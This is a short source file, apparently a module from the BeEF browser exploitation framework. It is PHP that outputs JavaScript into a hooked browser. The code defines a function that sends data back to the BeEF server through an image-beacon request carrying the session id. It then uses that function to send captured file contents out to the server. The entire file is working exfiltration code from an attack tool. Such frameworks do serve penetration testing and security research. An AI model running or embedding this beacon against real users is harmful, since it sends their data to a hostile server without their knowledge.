<?php
	// Copyright (c) 2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php");
?>

beef_url = "<?php echo BEEF_DOMAIN; ?>";

// ---[ RETURN_RESULT
// send result to beef
function return_result(action, data) {
	var img_tmp = new Image();
	var src = beef_url + '/hook/return.php?BeEFSession=<?php echo session_id(); ?>&action=' + action + '&data=' + escape(data);
	img_tmp.src = src;
}

return_result(result_id, file_content);

